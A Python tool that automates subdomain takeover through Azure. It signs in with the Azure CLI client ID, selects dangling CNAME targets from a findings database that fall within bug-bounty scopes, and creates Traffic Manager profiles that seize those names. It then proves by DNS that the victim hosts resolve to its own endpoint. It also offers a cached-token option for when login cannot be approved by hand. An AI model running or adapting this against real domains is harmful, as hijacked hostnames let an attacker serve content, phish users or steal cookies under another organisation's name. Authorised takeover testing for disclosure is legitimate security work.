#!/usr/bin/env python3
"""Azure ARM from Python, because `az login` will not authenticate on this tenant.

Two problems with the CLI, both client-side: az 2.92 treats `AADSTS70016 authorization pending` as
fatal instead of continuing to poll, so the device flow dies before the approval can land, and the
browser flow left `localhost:8400` waiting with no token. MSAL does the same device flow but keeps
polling until the code is approved or genuinely expires, so this script does the login itself and then
talks to the ARM REST API directly.

The token lives in this process only: never written to disk, never printed, never passed on a command
line. Everything the claim needs happens inside one run, so there is nothing to leak afterwards.

  python3 engine/azure_arm.py login                 # device flow, then list subscriptions
  python3 engine/azure_arm.py claim --dry-run       # what would be created
  python3 engine/azure_arm.py claim --apply         # create profiles, then prove by DNS
  python3 engine/azure_arm.py claim --apply --name combomobile-ac --name combomobile-st
"""
from __future__ import annotations

import argparse
import json
import re
import sqlite3
import subprocess
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path

import msal

ROOT = Path(__file__).resolve().parent.parent
DB = ROOT / "engine/state.db"
AUTHORITY = "https://login.microsoftonline.com/organizations"
ARM = "https://management.azure.com"
SCOPE = [f"{ARM}/.default"]
CLIENTS = {
    "cli": "04b07795-8ddb-461a-bbee-02f9e1bf7b46",        # Azure CLI
    "powershell": "1950a258-227b-4e31-a9cf-717495945fc2",  # Azure PowerShell
}
RG = "rg-takeover-poc"
LOCATION = "westeurope"
POC_HOST = "rdw-labz.github.io"


def dig(*args: str) -> str:
    p = subprocess.run(["dig", "+short", *args], capture_output=True, text=True, timeout=20)
    return p.stdout.strip()


def login(client: str) -> tuple[str, str]:
    app = msal.PublicClientApplication(CLIENTS[client], authority=AUTHORITY)
    flow = app.initiate_device_flow(scopes=SCOPE)
    if "user_code" not in flow:
        raise SystemExit(f"device flow refused: {flow.get('error_description', flow)}")
    print("=" * 70)
    print(f"  {flow['verification_uri']}   →   {flow['user_code']}")
    print("=" * 70, flush=True)
    result = app.acquire_token_by_device_flow(flow)  # msal polls until approved or expired
    if "access_token" not in result:
        raise SystemExit(f"login failed: {result.get('error')} — {result.get('error_description')}")
    print(f"authenticated as {result.get('id_token_claims', {}).get('preferred_username', '?')}", flush=True)
    return result["access_token"], result.get("id_token_claims", {}).get("tid", "")


def arm(token: str, method: str, path: str, body: dict | None = None) -> tuple[int, dict]:
    url = f"{ARM}{path}"
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method, headers={
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
        "Accept": "application/json",
    })
    try:
        with urllib.request.urlopen(req, timeout=120) as r:
            raw = r.read().decode("utf8", "replace")
            return r.status, (json.loads(raw) if raw.strip() else {})
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf8", "replace")
        try:
            return e.code, json.loads(raw)
        except json.JSONDecodeError:
            return e.code, {"raw": raw[:400]}


def subscriptions(token: str) -> list[dict]:
    code, body = arm(token, "GET", "/subscriptions?api-version=2022-12-01")
    if code != 200:
        print(f"subscriptions: HTTP {code} {json.dumps(body)[:300]}")
        return []
    return [s for s in body.get("value", []) if s.get("state") == "Enabled"]


def inventory(want: list[str] | None) -> list[dict]:
    ns = {"tm": "trafficmanager.net", "app": "azurewebsites.net"}
    c = sqlite3.connect(f"file:{DB}?mode=ro", uri=True)
    out = []
    for host, target in c.execute("SELECT host, target FROM findings WHERE claimable=1"):
        t = (target or "").rstrip(".").lower()
        k = next((k for k, n in ns.items() if t.endswith("." + n)), None)
        if not k:
            continue
        name = t[: -(len(ns[k]) + 1)]
        if want and name not in want:
            continue
        out.append({"host": host, "target": t, "kind": k, "name": name,
                    "available": dig(t, "A") == ""})
    return sorted(out, key=lambda r: (r["kind"], r["name"]))


def in_scope(names: list[dict]) -> list[dict]:
    sys.path.insert(0, str(ROOT / "engine"))
    from scope_cover import covers
    scopes = sqlite3.connect(f"file:{DB}?mode=ro", uri=True).execute(
        "SELECT platform, handle, asset FROM scopes").fetchall()
    keep = []
    for r in names:
        hit = next(((pl, hd, at) for pl, hd, at in scopes if covers(at, r["host"])), None)
        if hit:
            r["scope"] = f"{hit[0]}:{hit[1]} via {hit[2]}"
            keep.append(r)
    return keep


def ensure_rp(token: str, sub: str, namespace: str = "Microsoft.Network", tries: int = 20) -> str:
    """A brand-new subscription is not registered for any resource provider yet."""
    path = f"/subscriptions/{sub}/providers/{namespace}/register?api-version=2021-04-01"
    code, body = arm(token, "POST", path)
    state = body.get("registrationState", "")
    print(f"  provider {namespace}: HTTP {code} {state}")
    for _ in range(tries):
        if state == "Registered":
            return state
        time.sleep(6)
        c2, b2 = arm(token, "GET", f"/subscriptions/{sub}/providers/{namespace}?api-version=2021-04-01")
        state = b2.get("registrationState", state)
        if state == "Registered":
            print(f"  provider {namespace}: Registered")
            break
    return state


def ensure_rg(token: str, sub: str) -> int:
    code, body = arm(token, "PUT",
                     f"/subscriptions/{sub}/resourceGroups/{RG}?api-version=2021-04-01",
                     {"location": LOCATION, "tags": {"purpose": "subdomain-takeover-poc"}})
    print(f"  resource group {RG}: HTTP {code}")
    return code


def claim_tm(token: str, sub: str, name: str, poc_host: str) -> dict:
    """Create the Traffic Manager profile that owns `name.trafficmanager.net`."""
    body = {
        "location": "global",
        "tags": {"purpose": "subdomain-takeover-poc"},
        "properties": {
            "profileStatus": "Enabled",
            "trafficRoutingMethod": "Priority",
            "dnsConfig": {"relativeName": name, "ttl": 30},
            "monitorConfig": {"protocol": "HTTPS", "port": 443, "path": "/",
                              "intervalInSeconds": 30, "timeoutInSeconds": 10,
                              "toleratedNumberOfFailures": 3},
            "endpoints": [{
                "name": "poc",
                "type": "Microsoft.Network/trafficManagerProfiles/externalEndpoints",
                "properties": {"target": poc_host, "endpointStatus": "Enabled",
                               "priority": 1, "weight": 1},
            }],
        },
    }
    path = (f"/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Network"
            f"/trafficManagerProfiles/{name}?api-version=2022-04-01")
    code, resp = arm(token, "PUT", path, body)
    fqdn = resp.get("properties", {}).get("dnsConfig", {}).get("fqdn", "")
    print(f"  profile {name}: HTTP {code} fqdn={fqdn or '—'}")
    if code >= 300:
        print("   ", json.dumps(resp)[:400])
    return {"http": code, "fqdn": fqdn or f"{name}.trafficmanager.net"}


def prove(host: str, fqdn: str) -> dict:
    chain = dig("CNAME", host)
    a = dig(host, "A")
    tm_a = dig(fqdn, "A")
    return {"host": host, "victim_cname": chain, "victim_a": a,
            "profile_fqdn": fqdn, "profile_a": tm_a,
            "controlled": bool(a) and bool(tm_a) and set(a.split()) & set(tm_a.split())}


def wait_resolve(host: str, tries: int = 12) -> str:
    for _ in range(tries):
        a = dig(host, "A")
        if a:
            return a
        time.sleep(10)
    return ""


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("cmd", choices=["login", "claim"])
    ap.add_argument("--apply", action="store_true")
    ap.add_argument("--dry-run", action="store_true")
    ap.add_argument("--name", action="append", default=None)
    ap.add_argument("--client", choices=list(CLIENTS), default="cli")
    ap.add_argument("--sub", help="subscription id (default: first enabled)")
    ap.add_argument("--token-file", help="read a bearer token from this file instead of logging in "
                                        "(used when the Azure CLI token cache already holds a valid "
                                        "refresh token and a device flow cannot be approved by hand)")
    ap.add_argument("--poc-host", default=POC_HOST)
    a = ap.parse_args()

    if a.token_file:
        token = Path(a.token_file).read_text().strip()
        tid = ""
        print("using cached Azure CLI token", flush=True)
    else:
        token, tid = login(a.client)
    subs = subscriptions(token)
    if not subs:
        print("no enabled subscriptions on this identity — the portal shows one, so this token is "
              "probably scoped to a tenant without it. Try --client powershell.")
        return 5
    for s in subs:
        print(f"  sub {s['id']}  {s['displayName']}  ({s.get('tenantId','')[:8]}…)")
    sub = a.sub or subs[0]["id"]
    print(f"using subscription {sub}")
    if a.cmd == "login":
        return 0

    names = [r for r in inventory(a.name) if r["available"]]
    scoped = in_scope(names)
    print(f"\nclaimable and in scope: {len(scoped)}")
    for r in scoped:
        print(f"  {r['kind']:3} {r['name']:26} <- {r['host']:34} [{r['scope']}]")
    if not scoped:
        print("nothing to claim that a programme actually pays for")
        return 0
    if not a.apply:
        print("\ndry run: nothing created (add --apply)")
        return 0

    ensure_rp(token, sub)
    ensure_rg(token, sub)
    results = []
    for r in scoped:
        if r["kind"] != "tm":
            print(f"  {r['name']}: kind {r['kind']} not implemented over REST yet — skipped")
            continue
        made = claim_tm(token, sub, r["name"], a.poc_host)
        host_a = wait_resolve(r["host"])
        ev = prove(r["host"], made["fqdn"])
        ev["victim_a_after_wait"] = host_a
        results.append(ev)
        print(json.dumps(ev, indent=1))
    (ROOT / "reports/claim-evidence.json").write_text(json.dumps(results, indent=1))
    print(f"\nwrote reports/claim-evidence.json ({len(results)} proofs)")
    return 0


if __name__ == "__main__":
    sys.exit(main())
